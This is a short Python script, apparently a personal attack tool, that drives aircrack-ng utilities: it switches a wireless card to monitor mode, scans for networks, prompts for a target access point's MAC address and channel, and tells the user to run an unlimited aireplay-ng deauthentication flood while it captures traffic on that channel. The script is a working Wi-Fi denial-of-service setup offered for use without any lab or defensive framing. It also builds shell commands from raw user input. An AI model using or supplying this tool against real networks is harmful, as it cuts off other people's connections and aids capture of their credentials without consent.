import subprocess
import optparse
import time
def arguments():
    parse = optparse.OptionParser()
    parse.add_option("-i","--iface",dest="interface",help="interface such as wlan0 or wlan0mon to perform the task")
    options,arguments = parse.parse_args()
    if not options.interface:
        parse.error("enter interface -i or --iface")
    else:
        return options.interface

def  disable_wifi(_interface_):
    print("[+] "+_interface_+" is going to monitor mode.......!!!! ")
    subprocess.call("airmon-ng start "+_interface_,shell = True)
    subprocess.call("ifconfig ",shell = True)
    time.sleep(2)
    print("[+] Enter new interface or enter the same if not modified")
    new_interface = input("enter_new_interface:  ")
    try:
        print("[+] press Ctrl+c to stop the process.......!!!")
        time.sleep(1)
        subprocess.call("airodump-ng "+new_interface ,shell=True)
    except KeyboardInterrupt:
        print("[+] Keyboard interrupt found Ctrl+c ......... now enter the following: ")
    target_mac_wifi = input("enter the mac address of target wifi: ")
    target_wifi_channel = input("enter target wifi channel: ")
    print("[+] Target Wifi Details.......!!!")
    try:
        print("press Ctrl+C to stop the process...........")
        print("JUST RUN IT ON OTHER SHELL aireplay-ng -0 0 -a " + target_mac_wifi + " " + new_interface)

        print("Donot stop this process when you running upper command on other shell")
        time.sleep(1)
        subprocess.call("airodump-ng --bssid "+target_mac_wifi+" --channel "+target_wifi_channel +" "+ new_interface,shell = True)
    except KeyboardInterrupt:
        print("[+] Detected Keyboard interrupt.....!!")



def main():
    interface = arguments()
    disable_wifi(interface)

main()